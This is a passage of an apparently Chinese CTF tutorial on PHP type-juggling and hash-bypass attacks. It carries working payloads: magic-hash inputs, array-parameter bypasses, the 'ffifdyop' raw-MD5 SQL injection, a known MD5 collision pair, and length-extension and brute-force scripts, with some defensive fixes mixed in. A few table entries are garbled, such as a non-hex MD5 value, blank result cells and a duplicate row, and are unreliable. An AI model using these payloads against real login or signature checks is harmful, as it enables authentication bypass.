---
title: php类型
date: 2026-07-15
categories: [web安全, 常见漏洞]
type: tech
---

# PHP 类型安全与哈希绕过

> CTF Web 中 PHP 相关的漏洞，核心不是"破解哈希"，而是利用 PHP 动态类型系统和比较规则的**预期外的行为**。

---

## 零、哈希安全基础

### 0.1 哈希的三大安全目标

理解哈希攻击之前，必须先分清哈希的三个安全目标：

| 目标 | 定义 | 攻击难度 | CTF 出现频率 |
|:----:|------|:--------:|:-----------:|
|**原像抗性**| 已知摘要 `h`，找不到输入 `m` 使 `H(m)=h` | 最难 | 低（除非输入空间小） |
|**第二原像抗性**| 已知 `m1`，找不到 `m2` 使 `H(m1)=H(m2)` | 较难 | 中 |
|**碰撞抗性**| 找任意两个不同 `m1`、`m2` 使哈希相同 | 最容易（生日攻击） | 最高 |

**关键区分**：碰撞攻击 ≠ 原像攻击。发现一对 MD5 碰撞（两个不同输入产生相同哈希）不代表能反推出任意指定哈希的明文。

### 0.2 碰撞不等于破解

| 概念 | 已知条件 | 目标 | 典型例子 |
|:----|:---------|:-----|:---------|
| 密码爆破 | 已知哈希 | 找到符合业务的明文 | Hashcat 跑字典 |
| 原像攻击 | 已知指定哈希 | 找到任意输入命中该哈希 | MD5("?") = "5f4dcc..." |
| 第二原像 | 已知指定明文 | 找另一个同哈希明文 | 已知文件 A，找文件 B |
| 碰撞攻击 | 不指定哈希 | 找任意两个同哈希输入 | FastColl 生成碰撞对 |
| Magic Hash | PHP 弱比较 | 让两个不同哈希被当成数字 0 | 0e... == 0e... |
| 数组绕过 | PHP 类型错误 | 让两个错误返回值相同 | md5([]) === md5([]) |
| 长度扩展 | 已知前缀 MAC | 继续计算追加数据后的合法摘要 | HashPump 工具 |

### 0.3 盐（Salt）与胡椒（Pepper）

```text
hash(password + salt)     ← 盐：每个用户独立随机值
hash(password + pepper)   ← 胡椒：服务端全局秘密
```

盐的作用：
- 相同密码产生不同哈希（防止彩虹表）
- 不阻止针对单个弱密码的离线猜测

Pepper 是服务端额外保存的全局秘密，泄露后影响所有用户。

**正确做法**（PHP 内置）：

```php
$hash = password_hash($password, PASSWORD_DEFAULT);
// 自动生成随机盐，无需手动拼接
```

 **新手避坑**：盐不阻止离线爆破。如果一个哈希泄露且密码很弱（如 `123456`），加盐后的哈希仍然可以被单次猜测验证。盐主要防止彩虹表和批量破解，不弥补密码弱度。

### 0.4 根据长度初步判断哈希类型

| 形式 | 可能算法 |
|:----|:---------|
| 32 位十六进制 | MD5、NTLM、MD4 |
| 40 位十六进制 | SHA-1、RIPEMD-160 |
| 64 位十六进制 | SHA-256、BLAKE2s |
| 128 位十六进制 | SHA-512、BLAKE2b |
| `$2y$...` | bcrypt |
| `$argon2id$...` | Argon2id |

```
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
hashcat --identify '5f4dcc3b5aa765d61d8327deb882cf99'
```

 **新手避坑**：仅凭长度不能唯一确定算法。要结合源码函数、前缀格式、应用语言综合判断。识别工具只提供候选，最终回到源码验证。

---

## 一、场景

CTF 中遇到 PHP 题目，看到这样的代码：

```php
if (md5($a) == md5($b)) { /* 通过 */ }
if (md5($input) == $hash) { /* 通过 */ }
if ($input == md5($input)) { /* 通过 */ }
if (strcmp($pwd, $secret) == 0) { /* 通过 */ }
if (in_array($role, ['guest', 'admin'])) { /* 通过 */ }
```

这类题目的核心**不是破解哈希**，而是利用 PHP 比较规则的类型转换坑。

最有名的例子：

```php
var_dump(md5('240610708') == md5('QNKCDZO'));
// 输出: bool(true)  ← 两个不同字符串的哈希被当成相等
```

这是因为两个哈希都以 `0e` 开头，PHP 把它们当作科学计数法的**0**。

### 1.1 更广泛的类型安全视角

PHP 的弱类型问题远不止哈希比较。在输入来源日益多样的今天，JSON、YAML、XML 解析都可能引入意料之外的类型：

| 输入来源 | 可能得到的类型 | 典型陷阱 |
|---------|:------------:|---------|
| `$_GET` / `$_POST` | 字符串或数组 | 数组绕过 |
| `json_decode()` | 字符串、整数、布尔、null、数组 | JSON 数字 vs 字符串 |
| `file_get_contents('php://input')` | 原始字符串 | 需手动 `json_decode` |
| `parse_str()` | 字符串或数组 | 参数污染 |
| `$_FILES` | 关联数组 | 文件类型绕过 |
| `SimpleXML` 解析 | SimpleXMLElement 对象 | 对象转字符串行为 |

### 1.2 CTF 出题模式速览

| 模式 | 核心考点 | 常见标签 |
|------|---------|---------|
| Magic Hash | `==` + `0e` 数字字符串 | `md5()`、`sha1()` |
| 数组绕过 | 函数传数组报错返回 NULL | `md5()`、`strcmp()` |
| 真实碰撞 | 已知 MD5/SHA-1 碰撞对 | `hex2bin()` + `===` |
| 长度扩展 | `Hash(secret\|message)` | `sha256()`、长度扩展 |
| JSON 混淆 | `json_decode` 整数 vs 字符串 | `0 == "xxx"` |
| TOCTOU | 文件校验与使用的竞态 | `file_get_contents` |
| CRC32 线性 | CRC32 的 XOR 性质 | `crc32()` 做签名 |
| 二进制注入 | `raw=true` 原始字节 | SQL 拼接 |
| 双重哈希 | 多层 MD5 检查最终摘要 | `md5(md5())` |
| 截断哈希 | `substr(hash,0,n)` | 缩小搜索空间 |

---

## 二、原理

### 2.1 哈希函数速览

| 算法 | 十六进制长度 | 二进制长度 | 内部状态位宽 | 结构 | CTF 常见场景 |
|:----:|:----------:|:---------:|:----------:|:----:|------------|
| MD5 | 32 字符 | 128 bit | 128 bit | Merkle-Damgard | Magic Hash、碰撞、二进制注入 |
| SHA-1 | 40 字符 | 160 bit | 160 bit | Merkle-Damgard | Magic Hash、SHAttered |
| SHA-256 | 64 字符 | 256 bit | 256 bit | Merkle-Damgard | 长度扩展 |
| SHA-512 | 128 字符 | 512 bit | 512 bit | Merkle-Damgard | 长度扩展 |
| CRC32 | 8 字符 | 32 bit | 32 bit | 线性反馈移位寄存器 | 碰撞、线性 XOR 性质 |
| bcrypt | 60 字符 | 变长 | - | Blowfish | 密码存储（强度高） |
| Argon2 | 变长 | 变长 | - | 内存硬函数 | 密码存储（强度高） |

### 2.2 PHP 比较规则：== vs ===

```
==  (弱比较 / 松散比较)
  类型不同时自动转换
  数字字符串 → 数字
  "0e123456" → 0 (科学计数法)

=== (强比较 / 严格比较)
  类型不同直接返回 false
  不进行类型转换
```

#### 类型转换矩阵（PHP 7）

当 `==` 两侧类型不同时，PHP 遵循以下转换规则：

| 左侧类型 | 右侧类型 | 转换方向 |
|---------|---------|---------|
| string | int | 字符串转数字 |
| string | float | 字符串转浮点 |
| int | bool | int 转 bool（0→false, 其他→true） |
| string | bool | 空字符串→false, "0"→false, 其他→true |
| array | string | 不转换，直接 false |
| null | string | null 转 ""，"" 转 null |

**关键对比表**：

| 表达式 | PHP 7 结果 | PHP 8 结果 | 原因 |
|-------|:---------:|:---------:|------|
| `'0e123' == '0e456'` | `true` | `true` | 两者都是数字字符串 → 0 |
| `'1' == 1` | `true` | `true` | 字符串 "1" → 数字 1 |
| `'1' === 1` | `false` | `false` | 类型不同（string vs int） |
| `0 == 'foo'` | `true` | `false` | PHP 7 中 "foo" → 0；PHP 8 中非数字字符串不转 0 |
| `0 == ''` | `true` | `false` | PHP 7 中 "" → 0；PHP 8 修复 |
| `0 == '0'` | `true` | `true` | "0" → 数字 0 |
| `'0e123' === '0e456'` | `false` | `false` | 字符串文本不同 |
| `false == '0'` | `true` | `true` | '0' → false（转为 bool） |
| `false == null` | `true` | `true` | 两者在 bool 上下文中都视为 false |
| `null == '0'` | `false` | `false` | null 不等于非空字符串 |
| `'123abc' == 123` | `true` | `true` | 字符串前导数字 123 |

**重要结论**：
- Classic Magic Hash（`0e... == 0e...`）在 PHP 8 中**仍然有效**（因为两边都是数字字符串）
- `0 == '非数字字符串'` 在 PHP 8 中已修复
- PHP 8 的改动对 JSON 类型混淆攻击影响很大

### 2.3 十六进制摘要 vs 原始二进制

```php
$hex = md5('hello');           // 32 位十六进制字符串
$raw = md5('hello', true);     // 16 字节原始二进制
```

| 函数 | 默认输出 | 二进制标志 | 长度 |
|------|---------|:---------:|:----:|
| `md5($x)` | 十六进制 | `md5($x, true)` | 32 / 16 字节 |
| `sha1($x)` | 十六进制 | `sha1($x, true)` | 40 / 20 字节 |
| `hash('sha256', $x)` | 十六进制 | `hash('sha256', $x, true)` | 64 / 32 字节 |
| `crc32($x)` | 十进制整数 | 无二进制模式 | 4 字节 |

- Magic Hash 表针对的是**十六进制字符串**输出
- `raw=true` 时返回二进制，不适用 Magic Hash
- 但原始二进制可能出现特殊字符（如单引号、反斜杠），导致 SQL 注入

---

## 三、实战：判断流程图

```
看到 md5() / sha1() / hash()
  │
  ├── 检查比较符
  │     ├── == (弱比较)  →  攻击路径 A: Magic Hash
  │     └── === (强比较) →  攻击路径 B: 真实碰撞 / 数组绕过
  │
  ├── 检查数据类型
  │     ├── 字符串提交 → 确保 is_string 检查
  │     └── 数组提交   → 尝试数组绕过
  │
  ├── 检查 MAC 构造
  │     ├── Hash(secret || data) → 攻击路径 C: 长度扩展
  │     └── hash_hmac()          → 一般不受长度扩展
  │
  ├── 检查是否截断
  │     ├── substr(hash, 0, n)   → 爆破或前缀碰撞
  │     └── 数据库字段截断       → 使用部分哈希
  │
  └── 检查特殊场景
        ├── raw=true + SQL拼接  → 攻击路径 D: 二进制注入
        ├── CRC32 做签名        → 攻击路径 E: CRC32 线性攻击
        ├── 双重哈希            → 检查最终哈希
        ├── JSON 类型混淆       → 检查 json_decode 后的类型
        ├── TOCTOU              → 检查文件操作的竞态
        └── 低熵 Token          → 枚举输入
```

---

### 攻击路径 A：Magic Hash（弱比较）

#### 【场景】PHP 使用 == 比较哈希摘要

```php
// 弱比较题
if ($a !== $b && md5($a) == md5($b)) { /* pass */ }

// 已知摘要比较
if (md5($password) == $known_hash) { /* pass */ }

// 自身比较
if ($a == md5($a)) { /* pass */ }
```

#### 【原理】

哈希摘要满足格式：`^0+e[0-9]+$`（即 `0e` 后全是数字）

PHP 会把这样的字符串当成科学计数法：

```
0e462097431906509019562988736854
= 0 × 10^462097431906509019562988736854
= 0
```

两个 `0e...` 字符串用 `==` 比较时，都转成数字 0，因此相等。

#### 判断 Magic Hash 的正则

| 模式 | 示例 | 是否 Magic Hash |
|------|------|:--------------:|
| `^0+e[0-9]+$` | `0e462097431906509019562988736854` |  |
| `^0+e[a-f0-9]+$` | `0e3a5f2a80db371d4610b8f940d296af` | （e 后有字母 a-f） |
| `^[0-9]+e[0-9]+$` | `123e456` | （不是以 0e 开头） |
| `^0+e$` | `0e` | （e 后无数字） |

#### 【Payload 表】

**MD5 Magic Hash（完整版）**：

| 输入 | MD5 值 |
|:----:|--------|
| `240610708` | `0e462097431906509019562988736854` |
| `QNKCDZO` | `0e830400451993494058024219903391` |
| `s878926199a` | `0e545993274517709034328855841020` |
| `s155964671a` | `0e342768416822451524974117254469` |
| `s214587387a` | `0e848240070830420651810813331395` |
| `s1502113478a` | `0e861580163291561247404381396064` |
| `s1836677006a` | `0e481036490867661113260034900752` |
| `s1184209335a` | `0e072485820392773389450109079857` |
| `s1665632922a` | `0e731198061491163073197128363787` |
| `s1502113478a` | `0e861580163291561247404381396064` |
| `0e215962017` | `0e291242476940776845150308577824` |
| `0e1284838708` | `0e708973255513206049981532541321` |

| 输入 | MD5 值（双重验证：自身==md5自身） |
|:----:|--------|
| `0e215962017` | `0e291242476940776845150308577824` |

**SHA-1 Magic Hash**：

| 输入 | SHA-1 值 |
|:----:|----------|
| `10932435112` | `0e07766915004133176347055865026311692244` |
| `aaroZmOk` | `0e66507019969427134894567494305185566735` |
| `aaK1STfY` | `0e76658526655756207688271159624026011393` |
| `aaO8zKZF` | `0e89257456677279068558073954252716165668` |
| `aa3OFF9m` | `0e36977786278517984959260394024281014729` |

#### 【实战一：双参数弱比较】

```php
<?php
$a = $_GET['a'] ?? '';
$b = $_GET['b'] ?? '';

if (!is_string($a) || !is_string($b)) die('string only');

if ($a !== $b && md5($a) == md5($b)) {
    echo $flag;
}
```

Payload：

```
GET /?a=QNKCDZO&b=240610708
```

验证链：

```
a !== b              → true（两个字符串不同）
md5('QNKCDZO')       → "0e830400451993494058024219903391"
md5('240610708')     → "0e462097431906509019562988736854"
"0e830..." == "0e462..." → true（均被转为数字 0）
```

#### 【实战二：自身弱比较】

```php
if ($a == md5($a)) { echo $flag; }
```

Payload：`a=0e215962017`

```
a      = "0e215962017"  → 作为数字 = 0
md5(a) = "0e291242476940776845150308577824" → 作为数字 = 0
0 == 0 → true
```

#### 【实战三：双重哈希】

```php
if (md5(md5($a)) == md5(md5($b))) { echo $flag; }
```

此时必须检查**最终一次 MD5**是否符合 `^0+e[0-9]+$`。

```python
import hashlib, re

magic = re.compile(r"^0+e[0-9]+$", re.I)

candidates = ["CbDLytmyGm2xQyaLNhWn", "770hQgrBOjrcqftrlaZk"]

for v in candidates:
    first = hashlib.md5(v.encode()).hexdigest()
    second = hashlib.md5(first.encode()).hexdigest()
    print(v, second, bool(magic.match(second)))
```

**双重哈希关键概念对比**：

| 模式 | 需要检查的目标 | 常见错误 |
|------|--------------|---------|
| `md5(md5($a))` | 检查第二次 md5 的完整 32 位 | 只看第一次是否 0e |
| `md5($a . $salt)` | 检查 md5(拼接后) 的完整 32 位 | 误用不含盐的 Magic Hash 表 |
| `md5($a) == md5(md5($a))` | $a 本身须使两边相等 | 忘记两边不同的哈希结构 |

 **新手避坑**：
- 不要仅凭别人整理的 payload 表，**在本地按题目相同的编码和哈希顺序验证**
- `0e3a5f2a80db371d4610b8f940d296af` 虽然以 `0e` 开头，但含字母，不是 Magic Hash
- 如果中间有盐或额外拼接，Magic Hash 表可能失效
- 双重哈希中第一次哈希后的输出可能包含大写字母（某些算法），影响第二次哈希结果

#### 【Magic Hash 搜索脚本】

如果已知 Magic Hash 表不够用，可自行搜索：

```python
import hashlib, itertools, re

magic = re.compile(r"^0+e[0-9]+$", re.I)

for number in itertools.count():
    value = str(number)
    digest = hashlib.md5(value.encode()).hexdigest()
    if magic.fullmatch(digest):
        print(f"MD5: {value} → {digest}")
        break
```

纯 CPU 搜索可能很慢，实际可使用 GPU 或已公开的候选表。

#### 【Magic Hash 限制条件速查】

| 条件 | 要求 | 常见失败原因 |
|:----|:-----|:------------|
| 比较符 | 必须使用 `==` | 使用 `===` 时直接失败 |
| 摘要输出 | 十六进制字符串 | `raw=true` 返回二进制，不适用 |
| 摘要格式 | `^0+e[0-9]+$` | e 后有字母（如 `0e3a5f...`） |
| 输入控制 | 可以自由构造 | 有输入长度或字符限制 |
| 加盐/前缀 | 必须不含额外数据 | 哈希前拼接了不可控字符串 |
| PHP 版本 | 7 和 8 都支持 | JSON 类型混淆场景有差异 |
| 类型检查 | 服务端无 `is_string()` | 类型检查通过但值本身需是字符串 |

#### 【搜索已知哈希是否为 Magic Hash 的流程】

拿到一个已知哈希，判断它是否适合 Magic Hash：

```text
已知哈希 "0e830400451993494058024219903391"
  ├── 以 "0e" 开头？  → 是
  ├── "0e" 后全是数字？ → 是（验证通过）
  ├── "0e" 后有字母？  → 否
  ├── 适合 Magic Hash?  →
  └── 可以提交任意 Magic Hash 明文
       ├── QNKCDZO → 0e83040045...
       └── 240610708 → 0e46209743...
```

 **新手避坑**：已知哈希以 `0e` 开头但不代表服务端存储的就是 Magic Hash 明文。如果服务端存储的是 `0e830400451993494058024219903391`，确实可以提交 `QNKCDZO` 来匹配，但前提是 `md5($input) == $stored_hash` 且服务端没有额外拼接。

#### 【实战四：已知摘要弱比较】

```php
$stored_hash = '0e830400451993494058024219903391';
if (md5($password) == $stored_hash) { echo 'login'; }
```

此时只需提交 `240610708`，其 MD5 为 `0e462097431906509019562988736854`。虽然两个 hash 字符串不同，但均为 `0e` 开头，`==` 比较时都转成数字 0。

| 服务端存储的 hash | 攻击者提交的 password | 服务端计算的 hash | `==` 结果 |
|:-----------------:|:--------------------:|:-----------------:|:---------:|
| `0e83040045...` | `240610708` | `0e46209743...` | `true` |
| `0e83040045...` | `QNKCDZO` | `0e83040045...` | `true` |

---

### 攻击路径 B：真实碰撞 / 数组绕过（强比较）

#### 3.1 数组绕过（旧版 PHP）

【场景】使用 `===` 强比较，但参数可以传数组。

```php
if ($a != $b && md5($a) === md5($b)) { /* pass */ }
```

【原理】旧版 PHP 中，`md5([...])` 传入数组会产生 Warning 并返回 `NULL`。

Payload：
```
a[]=1&b[]=2
```

执行链：

```
a ≠ b       → true（两个不同数组）
md5(a)      → NULL（Warning 但继续执行）
md5(b)      → NULL
NULL === NULL → true
```

#### 数组绕过适用函数一览

| 函数 | 正常参数类型 | 数组传参结果 (PHP < 8) | PHP 8 行为 |
|------|:-----------:|:----------------------:|:---------:|
| `md5()` | string | NULL + Warning | TypeError |
| `sha1()` | string | NULL + Warning | TypeError |
| `strcmp()` | string | NULL + Warning | TypeError |
| `strlen()` | string | NULL + Warning | TypeError |
| `substr()` | string | NULL + Warning | TypeError |
| `in_array()` | mixed | 弱比较可绕过 | 仍然弱比较 |

 **此技巧在 PHP 8 中失效**：PHP 8 对内部函数非法参数类型抛出 `TypeError` 并中断执行。

#### 3.2 `strcmp()` 数组绕过

```php
if (!strcmp($_POST['password'], $secret)) { echo $flag; }
```

Payload：`password[]=x`

旧版 PHP 中，`strcmp(数组, 字符串)` 返回 `NULL`，`!NULL` 为 `true`。

**strcmp 返回值的真相**：

| 条件 | 返回值 | 对应真假 |
|------|:-----:|:--------:|
| `strcmp("a", "a")` | 0 | `!0` = true |
| `strcmp("a", "b")` | -1 或 1 | `!(-1)` = false |
| `strcmp([], "x")` (PHP 7) | NULL | `!NULL` = true |
| `strcmp([], "x")` (PHP 8) | TypeError | 中断 |

 PHP 8 中同样会抛出 `TypeError`。

#### 3.3 真实 MD5 碰撞

【场景】输入经过 `hex2bin()` 转换，且使用 `===`。

```php
$a = hex2bin($_POST['a']);
$b = hex2bin($_POST['b']);

if ($a !== $b && md5($a) === md5($b)) { echo $flag; }
```

【原理】两个不同数据块具有相同的 MD5 值。

```python
import hashlib

# 已知碰撞对（128 字节）
a_hex = (
    "d131dd02c5e6eec4693d9a0698aff95c"
    "2fcab58712467eab4004583eb8fb7f89"
    "55ad340609f4b30283e488832571415a"
    "085125e8f7cdc99fd91dbdf280373c5b"
    "d8823e3156348f5bae6dacd436c919c6"
    "dd53e2b487da03fd02396306d248cda0"
    "e99f33420f577ee8ce54b67080a80d1e"
    "c69821bcb6a8839396f9652b6ff72a70"
)
b_hex = (
    "d131dd02c5e6eec4693d9a0698aff95c"
    "2fcab50712467eab4004583eb8fb7f89"
    "55ad340609f4b30283e4888325f1415a"
    "085125e8f7cdc99fd91dbd7280373c5b"
    "d8823e3156348f5bae6dacd436c919c6"
    "dd53e23487da03fd02396306d248cda0"
    "e99f33420f577ee8ce54b67080280d1e"
    "c69821bcb6a8839396f965ab6ff72a70"
)

a = bytes.fromhex(a_hex)
b = bytes.fromhex(b_hex)

print(a != b)                                    # True
print(hashlib.md5(a).hexdigest())                # 79054025255fb1a26e4bc422aef54eb4
print(hashlib.md5(b).hexdigest())                # 79054025255fb1a26e4bc422aef54eb4
```

**提交方式**：注意二进制数据在传输中可能被破坏。

| 传输方式 | 原始数据格式 | 风险 |
|---------|-------------|------|
| URL 参数 | 需 URL 编码 | `+` 被解释为空格 |
| 表单 POST | `application/x-www-form-urlencoded` | 二进制字节可能被截断 |
| `hex2bin()` 接收 | 十六进制字符串 | 最安全的传输方式 |
| 文件上传 | `multipart/form-data` | 适合超大碰撞块 |
| Base64 | Base64 字符串 | 服务端需解码 |

#### 3.4 SHA-1 SHAttered 碰撞

```bash
# 两个不同 PDF 文件具有相同 SHA-1
sha1sum shattered-1.pdf shattered-2.pdf
# 38762cf7f55934b34d179ae6a4c80cadccbb7f0a (same)
sha256sum shattered-1.pdf shattered-2.pdf
# 不同
```

| 属性 | shattered-1.pdf | shattered-2.pdf |
|------|:--------------:|:--------------:|
| SHA-1 | `38762cf7f55934b34d179ae6a4c80cadccbb7f0a` | `38762cf7f55934b34d179ae6a4c80cadccbb7f0a` |
| SHA-256 | `16bd503...3a3c51c` | `d4489d7...e94036f` |
| 文件大小 | 422,435 字节 | 422,435 字节 |
| 文件内容 | 不同 | 不同 |

 这是一对固定的碰撞文件，**不能**对任意目标生成第二原像。

**MD5 与 SHA-1 碰撞能力对比**：

| 属性 | MD5 | SHA-1 |
|:----:|:---:|:-----:|
| 实用碰撞 |  容易构造（几秒~几小时） |  SHAttered（需巨大算力） |
| 选择前缀碰撞 |  可行 |  公开尚不可行 |
| 第二原像攻击 |  不可行 |  不可行 |
| 生日攻击复杂度 | 2^64 | 2^80 |
| CTF 常见度 | 常见 | 较少（仅用 SHAttered 样本） |

---

### 攻击路径 C：哈希长度扩展

#### 【场景】

```php
$mac = hash('sha256', $secret . $message);
// 已知：message, mac
// 目标：追加内容 &admin=1
```

#### 【原理】

MD5、SHA-1、SHA-256 等 Merkle-Damgard 结构哈希，在计算过程中会保留内部状态。摘要输出泄露了最终状态，使得攻击者可以**从该状态继续计算**。

```
已知: secret || message || padding
                      ↕ 从这个状态继续
构造: secret || message || padding || extension
```

#### 易受攻击的算法对比

| 算法 | 易受长度扩展 | 块大小 | 说明 |
|:----:|:-----------:|:-----:|------|
| MD5 |  | 512 bit | 经典长度扩展 |
| SHA-1 |  | 512 bit | 经典长度扩展 |
| SHA-256 |  | 512 bit | 经典长度扩展 |
| SHA-512 |  | 1024 bit | 经典长度扩展 |
| SHA-3 (Keccak) |  | - | 海绵结构，不受影响 |
| BLAKE2 |  | - | HAIFA 结构，不受影响 |
| HMAC |  | - | 双重哈希设计，不受影响 |

#### 【使用 HashPump】

```python
import hashpumpy

original_mac = "已知的32字节SHA256"   # 64位十六进制
original_data = b"user=guest&admin=0"
append_data = b"&admin=1"
secret_len = 16

new_mac, new_data = hashpumpy.hashpump(
    original_mac,
    original_data,
    append_data,
    secret_len,
)

print(f"新数据 (hex): {new_data.hex()}")
print(f"新 MAC: {new_mac}")
```

**如果密钥长度未知**，枚举 1~64：

```python
for secret_len in range(1, 65):
    new_mac, new_data = hashpumpy.hashpump(
        original_mac, original_data, append_data, secret_len
    )
    # 发送请求测试
```

#### 解析器差异导致长度扩展的成败

长度扩展构造出的 `padding` 字节包含不可打印字符。服务器对数据的解析方式至关重要：

| 解析方式 | padding 处理 | 攻击可行性 |
|---------|:-----------:|:---------:|
| PHP `parse_str()` | 二进制作参数名，被跳过 |  扩展内容被正确解析 |
| Python `parse_qs()` | 同上 |  |
| Java `URLDecoder` | 遇到 `%` 解析异常 |  可能失败 |
| 正则提取关键参数 | 忽略乱码 |  仅需正确出现扩展参数 |
| JSON 解码 | 乱码导致解析失败 |  |

#### 【限制条件】

| 适用 | 不适用 |
|------|-------|
| `Hash(secret || message)` | `Hash(message || secret)` |
| MD5, SHA-1, SHA-256 | HMAC, bcrypt, Argon2, SHA-3 |
| 知道原始 message | 只知道 hash(message) |
| 能传递二进制的接口 | 只接受可打印字符的接口 |

 **新手避坑**：
- 即使比较使用了 `hash_equals()`，MAC 构造 `Hash(secret||data)` 仍然存在长度扩展漏洞
- 正确做法是使用 `hash_hmac('sha256', $message, $secret)`
- 长度扩展产生的 padding 字节是固定的，可以预先计算
- 不要忽视最后一个参数的生效规则（第一个值 vs 最后一个值）

---

### 攻击路径 D：特殊哈希场景

#### 4.1 原始二进制 SQL 注入

```php
$digest = md5($password, true);   // 原始二进制
$sql = "SELECT * FROM users WHERE password = '$digest'";
```

输入 `ffifdyop`，其原始 MD5 开头字节是 `'or'6`，可闭合 SQL 语句。

```python
import hashlib
d = hashlib.md5(b"ffifdyop").digest()
print(repr(d))  # b'\'or\'6\xc9]...'
```

**更多可用于二进制注入的输入**：

| 输入 | 原始 MD5（十六进制） | 开头 ASCII 效果 |
|:----:|:------------------:|:--------------:|
| `ffifdyop` | `276f722736c95d99e921722cf9ed621c` | `'or'6...` |
| `129581926211651571912466741651878684928` | `06da5430449f8f6b23dfc1276f722738` | 包含 `or` |
| `a"g` | `80061894370531582526977585356874153034` | 含引号 |
| `"or 1=1--`（配合 SQL 注入） | 取决于编码 | SQL 注释 |

#### 4.2 截断哈希

```php
$short = substr(hash('sha256', $data), 0, 6);  // 只有 24 bit
```

搜索空间：`16^6 = 2^24 ≈ 1600 万`，远小于完整 SHA-256。

**截断长度与搜索空间对应表**：

| 截断长度（hex） | 有效 bit | 搜索空间 | Python MD5 大致搜索时间 |
|:--------------:|:-------:|:--------:|:----------------------:|
| 4 字符 | 16 bit | 65,536 | 即时 |
| 6 字符 | 24 bit | 16,777,216 | ~30 秒 |
| 8 字符 | 32 bit | 4.3 × 10^9 | ~2 小时 |
| 10 字符 | 40 bit | 1.1 × 10^12 | 不可行（单线程） |

```python
import hashlib

target = hashlib.sha256(b"secret").hexdigest()[:6]

for i in range(10_000_000):
    h = hashlib.sha256(str(i).encode()).hexdigest()[:6]
    if h == target:
        print(f"碰撞: {i}")
        break
```

#### 4.3 JSON 类型混淆（详解）

```php
$data = json_decode(file_get_contents('php://input'), true);
if ($data['token'] == $expected) { /* pass */ }
```

请求 `{"token": 0}` 时，`$data['token']` 是整数 0，不是字符串 `"0"`。

**JSON 类型 vs PHP 类型映射表**：

| JSON 值 | json_decode 结果（PHP） | 类型 |
|---------|:---------------------:|:----:|
| `"hello"` | `"hello"` | string |
| `123` | `123` | int |
| `123.45` | `123.45` | float |
| `true` | `true` | bool |
| `false` | `false` | bool |
| `null` | `NULL` | NULL |
| `[1,2,3]` | `[1,2,3]` | array |
| `{"a":1}` | `["a"=>1]` | array |

**JSON 类型混淆实战场景**：

| 源码 | 攻击 payload | PHP 7 效果 | PHP 8 效果 |
|------|:-----------:|:---------:|:---------:|
| `$data['admin'] == true` | `{"admin":true}` | `true == true`  | `true == true`  |
| `$data['role'] == 'admin'` | `{"role":true}` | `true == 'admin'`  | `true == 'admin'`  |
| `$data['role'] == 0` | `{"role":"0"}` | `"0" == 0`  | `"0" == 0`  |
| `$data['token'] == $hash` | `{"token":0}` | `0 == $hash` 看 $hash | `0 == $hash` 看 $hash |
| `$data['count'] == ''` | `{"count":0}` | `0 == ''`  | `0 == ''`  |
| `is_string($data['x'])` | `{"x":true}` | `is_string(true)`  | `is_string(true)`  |

**防御方法**：

```php
// 在比较前验证类型
$data = json_decode(file_get_contents('php://input'), true);
if (!is_string($data['token'])) {
    die('token must be string');
}
```

#### 4.4 低熵 Token

```php
$token = md5($username . time());
```

即使 MD5 输出很长，输入空间只有（已知用户名 + 几秒范围的时间戳）= 少数枚举。

| Token 生成方式 | 熵来源 | 搜索空间 | 爆破可行性 |
|---------------|:-----:|:--------:|:---------:|
| `md5(username + time())` | 用户名 + 秒级时间戳 | 几十个 |  即时爆破 |
| `md5(rand(0,999999))` | 6 位数字 | 1,000,000 |  秒级 |
| `md5(uniqid())` | 微秒级 | ~10^6 |  秒级 |
| `random_bytes(32)` | 256 bit 真随机 | 2^256 |  不可行 |
| `bin2hex(random_bytes(16))` | 128 bit 真随机 | 2^128 |  不可行 |

**正确做法**：
```php
$token = bin2hex(random_bytes(32));
```

#### 4.5 `in_array()` 弱类型绕过

```php
if (in_array($role, ['guest', 'admin'])) {
    // 非严格比较 — 默认行为！
}
```

```php
// 传入 role=0
// 0 == 'guest' → PHP 7 true! PHP 8 false
// 0 == 'admin' → PHP 7 true! PHP 8 false
```

`in_array` 默认第三个参数为 `false`，使用 `==` 弱比较。

安全写法：
```php
if (in_array($role, ['guest', 'admin'], true)) {
    // 严格比较
}
```

#### 4.6 `switch` 弱类型

```php
switch ($type) {
    case 'admin':
        // 可能是由于弱比较进入
        break;
    case 'guest':
        break;
}
```

`switch` 同样使用 `==` 比较。如果 `$type` 来自 JSON `{"type":0}`，可能意外匹配到任意 case。

#### 4.7 `array_search()` 弱类型

```php
$key = array_search($value, $array);  // 默认弱比较
```

与 `in_array` 相同的陷阱，第三个参数 `true` 开启严格比较。

---

### 攻击路径 E：CRC32 线性攻击详解

#### 【场景】使用 CRC32 做签名验证

```php
function sign($data) {
    return crc32($secret . $data);
}

// 攻击者可以生成两个不同数据，使签名相同
```

#### 【原理】CRC32 的线性性质

CRC32 是基于线性反馈移位寄存器（LFSR）的校验算法，具有**线性性质**：

```
CRC32(A XOR B) = CRC32(A) XOR CRC32(B) XOR constant
```

这意味着 CRC32**不是**密码学安全的 MAC，攻击者可以：
1.**直接碰撞**：找到两个不同输入产生相同 CRC32
2.**预测修改**：知道修改数据后的 CRC32 变化，不改变签名值
3.**选择前缀碰撞**：构造任意前缀下的 CRC32 碰撞

#### CRC32 vs 密码学哈希对比

| 属性 | CRC32 | MD5 | SHA-256 |
|:----:|:-----:|:---:|:-------:|
| 输出长度 | 32 bit | 128 bit | 256 bit |
| 碰撞抗性 |  极易碰撞（2^16 生日攻击） |  有实用碰撞 |  尚可 |
| 线性性质 |  具有 XOR 线性 |  |  |
| 正向计算速度 | 极快（硬件加速） | 快 | 中等 |
| 适用场景 | 传输错误检测 | 完整性校验 | 密码哈希 |
| CTF 用途 | 绕过弱签名校验 | Magic Hash / 碰撞 | 长度扩展 |

#### CRC32 碰撞实现

搜索空间仅 2^32，生日攻击仅需 2^16 次尝试即可找到一对碰撞：

```python
import zlib

def crc32_collision(target_length=8):
    """找到一对碰撞：两个不同字符串具有相同 CRC32"""
    seen = {}
    for i in range(2**20):  # 远超过 2^16 即可
        data = f"data-{i}".encode()
        h = zlib.crc32(data)
        if h in seen:
            print(f"碰撞发现: {seen[h]} 和 {data} 都有 CRC32={h}")
            return
        seen[h] = data

crc32_collision()
```

#### CRC32 XOR 性质应用

```python
import zlib

# 已知原始数据 A 和 B，求 CRC32(A XOR B)
data_a = b"original_message"
data_b = b"modified_message"

# 逐字节 XOR
xored = bytes(a ^ b for a, b in zip(data_a, data_b))
print(f"CRC32(A): {zlib.crc32(data_a)}")
